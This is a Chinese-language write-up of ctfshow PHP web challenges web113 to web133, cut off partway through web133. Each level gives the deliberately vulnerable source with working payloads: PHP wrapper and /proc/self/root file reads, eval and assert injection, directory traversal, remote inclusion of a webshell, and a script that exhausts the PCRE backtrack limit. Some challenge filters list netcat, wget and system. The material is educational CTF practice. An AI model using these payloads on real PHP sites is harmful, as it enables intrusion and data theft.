<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.quoted-printable-encode/</span>resource=flag.php</span><br><span class="line">file=compress.zlib:<span class="regexp">//</span>flag.php</span><br><span class="line">file=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.iconv.utf-8.utf-16le/</span>resource=flag.php</span><br></pre></td></tr></table></figure>


<h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<blockquote>
<p>file=comporess.zlib//flag.php</p>
</blockquote>
<p>payload:</p>
<blockquote>
<p>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</p>
</blockquote>
<p><strong>在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容.多次重复后可以绕过is_file</strong></p>
<h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; 师傅们居然tql都是非预期 哼！</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<blockquote>
<p>?file=php://filter/resource=flag.php</p>
</blockquote>
<h2 id="web-115"><a href="#web-115" class="headerlink" title="web 115"></a>web 115</h2><p><strong>trim — 去除字符串首尾处的空白字符（或者其他字符）</strong></p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">说明 <span class="operator">¶</span></span><br><span class="line">trim ( string <span class="variable">$str</span> , string <span class="variable">$character_mask</span> <span class="operator">=</span> <span class="string">&quot; <span class="subst">\t</span><span class="subst">\n</span><span class="subst">\r</span><span class="subst">\0</span>\x0B&quot;</span> ) : string</span><br><span class="line">此函数返回字符串 str 去除首尾空白字符后的结果<span class="operator">。</span>如果不指定第二个参数，trim() 将去除这些字符：</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; &quot;</span> (<span class="type">ASCII</span> <span class="number">32</span> (<span class="number">0x20</span>))，普通空格符<span class="operator">。</span></span><br><span class="line"><span class="string">&quot;<span class="subst">\t</span>&quot;</span> (<span class="type">ASCII</span> <span class="number">9</span> (<span class="number">0x09</span>))，制表符<span class="operator">。</span></span><br><span class="line"><span class="string">&quot;<span class="subst">\n</span>&quot;</span> (<span class="type">ASCII</span> <span class="number">10</span> (<span class="number">0x0A</span>))，换行符<span class="operator">。</span></span><br><span class="line"><span class="string">&quot;<span class="subst">\r</span>&quot;</span> (<span class="type">ASCII</span> <span class="number">13</span> (<span class="number">0x0D</span>))，回车符<span class="operator">。</span></span><br><span class="line"><span class="string">&quot;<span class="subst">\0</span>&quot;</span> (<span class="type">ASCII</span> <span class="number">0</span> (<span class="number">0x00</span>))，空字节符<span class="operator">。</span></span><br><span class="line"><span class="string">&quot;\x0B&quot;</span> (<span class="type">ASCII</span> <span class="number">11</span> (<span class="number">0x0B</span>))，垂直制表符<span class="operator">。</span></span><br></pre></td></tr></table></figure>
<p>fuzz下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;<span class="number">128</span> ; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$x</span>=chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$x</span>) <span class="keyword">and</span> trim(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> urlencode(chr(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//%0C (换页符)</span></span><br></pre></td></tr></table></figure>
<p>payload:</p>
<blockquote>
<p>?num=%0C36</p>
</blockquote>
<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一个需要绕过的地方<code>isset($_POST[&#39;CTF_SHOW.COM&#39;])</code>，因为php变量命名是不允许使用点号的</p>
<p>PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格 + . [转换为_<br>但是有一个特性可以绕过,使变量名出现.之类的<br>特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了<br>如 CTF[SHOW.COM=&gt;CTF_SHOW.COM</p>
<p>可以测试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输入 CTF_SHOW.COM=<span class="number">1</span></span><br><span class="line">返回</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;CTF_SHOW_COM&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;1&#x27;</span> (length=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    输入 CTF[SHOW.COM=<span class="number">1</span></span><br><span class="line">返回</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;CTF_SHOW.COM&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;1&#x27;</span> (length=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<blockquote>
<p>post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</p>
</blockquote>
<p>直接在<code>eval(&quot;$c&quot;.&quot;;&quot;); </code>这一步就将flag输出，不继续进行下一个flag的比较</p>
<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>php中的<code>$_SERVER[&#39;argv&#39;]</code> </p>
<ol>
<li>在cli模式下(命令行)<br><code>$_SERVER[&#39;argv&#39;][0] </code>为文件名,其余是传递给脚本的参数</li>
</ol>
<p><img src="https://img.npfs06.top/20210308001803.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>2.在web网页模式下</p>
<p>在php.ini开启register_argc_argv配置项 设置register_argc_argv = On</p>
<blockquote>
<p>php.ini :<br>register_argc_argv = On</p>
</blockquote>
<p><code>$_SERVER[&#39;argv&#39;][0] </code>为我们传递的第一个参数</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/20210222183051.png"></p>
<p>所以可以控制<code>$a[&#39;0&#39;]</code></p>
<p><strong>解法一：</strong></p>
<p>payload：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">POST <span class="attribute">CTF_SHOW</span>=1&amp;CTF[SHOW.<span class="attribute">COM</span>=1&amp;fun=assert($a[0])</span><br><span class="line"><span class="builtin-name">GET</span> /?<span class="variable">$fl0g</span>=flag_give_me;</span><br></pre></td></tr></table></figure>


<p><strong>解法二</strong></p>
<p>在<code>$_SERVER[&#39;argv&#39;][0]</code>中，对于传递的参数，可以通过加号<code>+</code>进行分割</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/20210222183825.png"></p>
<p>payload:</p>
<blockquote>
<p>parse_str() 函数把查询字符串解析到变量中。</p>
</blockquote>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span>: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="function"><span class="keyword">fun</span>=<span class="title">parse_str</span><span class="params">($a[<span class="number">1</span>])</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span>: a=<span class="number">1</span>+$fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="function"><span class="keyword">fun</span>=<span class="title">assert</span><span class="params">($a[<span class="number">1</span>])</span></span></span><br></pre></td></tr></table></figure>


<p><strong>解法三</strong></p>
<p>payload:</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">GET:?<span class="number">1</span>=flag.php POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="function"><span class="keyword">fun</span>=<span class="title">highlight_file</span><span class="params">($_GET[<span class="number">1</span>])</span></span></span><br></pre></td></tr></table></figure>


<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>同web125</p>
<p>payload:</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span>: a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">post: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;<span class="function"><span class="keyword">fun</span>=<span class="title">parse_str</span><span class="params">($a[<span class="number">1</span>])</span></span></span><br></pre></td></tr></table></figure>


<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<blockquote>
<p>$_SERVER[“QUERY_STRING”]  获取查询 语句，获取的是GET传参?后面的值</p>
</blockquote>
<p><a href="http://localhost/aaa/index.php?p=222&amp;q=333">http://localhost/aaa/index.php?p=222&amp;q=333</a><br>结果：<br>$_SERVER[‘QUERY_STRING’] = “p=222&amp;q=333”;</p>
<p>在国家php解析特性：</p>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/20210223101059.png"></p>
<p>payload:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?ctf%<span class="attribute">20show</span>=ilove36d</span><br></pre></td></tr></table></figure>


<h2 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>知识点：gettext拓展的使用</p>
<p>在开启该拓展后 _() 等效于 gettext()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> gettext(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果  phpinfo</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">结果 phpinfo</span><br></pre></td></tr></table></figure>
<p>所以 <code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code> 返回的就是phpinfo</p>
<p>因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get_defined_vars ( <span class="keyword">void</span> ) : <span class="keyword">array</span></span><br><span class="line">此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/20210223102205.png"></p>
<p>payload:</p>
<blockquote>
<p>?f1=_&amp;f2=get_defined_vars</p>
</blockquote>
<h2 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>解法一：</strong></p>
<p>利用目录穿越漏洞绕过 stripos 检测字符</p>
<blockquote>
<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>
</blockquote>
<p><code>paylaod: ?f=/ctfshow/../../../../../../../../../var/www/html/flag.php</code></p>
<p><strong>解法二：</strong></p>
<p>php伪协议绕过</p>
<p><code>payload: ?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</code><br>filter伪协议支持多种编码方式，无效的就被忽略掉了。</p>
<p><strong>解法三：</strong></p>
<p>远程文件包含，在自己的服务器上写个一句话，然后保存为txt文档。<br>例如 f=<a href="http://url/xxx.txt?ctfshow">http://url/xxx.txt?ctfshow</a><br>其中xxx.txt为一句话</p>
<h2 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h2>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, <span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>知识点：利用正则最大回溯次数绕过</p>
<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br>回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://f6736092-7d96-46c5-bfb7-a31f636efae9.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">   <span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>非预期解</p>
<figure class="highlight fix"><table><tr><td class="code"><pre><span class="line"><span class="attr">利用数组 f[]</span>=<span class="string">ctfshow</span></span><br></pre></td></tr></table></figure>


<h2 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h2><p>同web130</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://8715c060-efb8-4525-a41e-7fe820b209d8.chall.ctf.show:8080/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>


<h2 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h2><p>扫描后台目录，存在/admin</p>
<p>或者访问/robots.txt,之后访问/admin</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$code</span> === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; <span class="variable">$password</span> === <span class="variable">$flag</span> || <span class="variable">$username</span> ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$code</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>知识点： <code>||</code>优先级低于<code>&amp;&amp;</code>，对于与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//123</span></span><br></pre></td></tr></table></figure>
<p>所以说我们只要让<code>$username ===&quot;admin&quot;</code>j即可绕过第一个if语句</p>
<p>payload:</p>
<blockquote>
<p>?username=admin&amp;password=1&amp;code=admin</p>
</blockquote>
<h2 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, <span class="variable">$F</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr(<span class="variable">$F</span>,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 